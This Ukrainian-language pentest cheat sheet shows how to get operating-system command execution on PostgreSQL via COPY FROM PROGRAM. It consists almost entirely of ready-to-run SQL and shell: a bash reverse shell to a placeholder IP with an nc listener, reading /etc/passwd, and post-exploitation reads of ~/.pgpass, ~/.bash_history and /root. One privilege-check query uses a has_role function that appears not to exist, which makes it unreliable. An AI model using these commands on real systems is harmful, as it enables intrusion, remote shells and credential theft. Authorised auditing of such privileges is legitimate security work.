# PostgreSQL: Тестування прав на виконання COPY FROM PROGRAM

Цей документ є шпаргалкою для пентесту або аудиту PostgreSQL щодо наявності привілеїв, які дозволяють **виконання системних команд** через SQL.

---

## 📌 Ціль

Визначити, чи має користувач можливість виконання `COPY FROM PROGRAM`, що відкриває вектор до RCE.

---
## ✅ Підключення PostgreSQL

psql -h hostname/ip -p 6543 -U postgres -d database


---
## ✅ Перевірка версії PostgreSQL

```sql
SELECT version();
-- або
SHOW server_version;
```

---

## ✅ Перевірка поточного користувача

```sql
SELECT current_user, session_user;
```

---

## ✅ Тест на виконання системної команди

### Створення тимчасової таблиці для виводу

```sql
CREATE TEMP TABLE poc_output(line text);
```

### Тестова команда ОС (наприклад `id`)

```sql
COPY poc_output FROM PROGRAM 'id';
SELECT * FROM poc_output;
```

### Reverse shell (приклад з bash)

```sql
COPY poc_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"';
```

На машині атакуючого:

```bash
nc -lvnp 4444
```

---

## 🔍 Перевірка: хто має доступ до COPY FROM PROGRAM

### Перевірити ролі, що мають привілей `pg_execute_server_program`

```sql
SELECT rolname
FROM pg_roles
WHERE pg_has_role(rolname, 'pg_execute_server_program', 'member');
```

### Перевірити, чи поточний користувач має це право

```sql
SELECT has_role(current_user, 'pg_execute_server_program', 'member');
```

---

## 🔎 Перевірка суперкористувача

```sql
SELECT rolname, rolsuper
FROM pg_roles
WHERE rolname = current_user;
```

---

## 🧾 Перевірка /etc/passwd (доказ читання файлів)

```sql
COPY poc_output FROM PROGRAM 'cat /etc/passwd';
SELECT * FROM poc_output;
```

---

## 🛠 Інші корисні перевірки в shell (якщо отримано RCE)

```bash
whoami
id
groups
sudo -l
cat ~/.bash_history
cat ~/.pgpass
ls -la /root
```

---
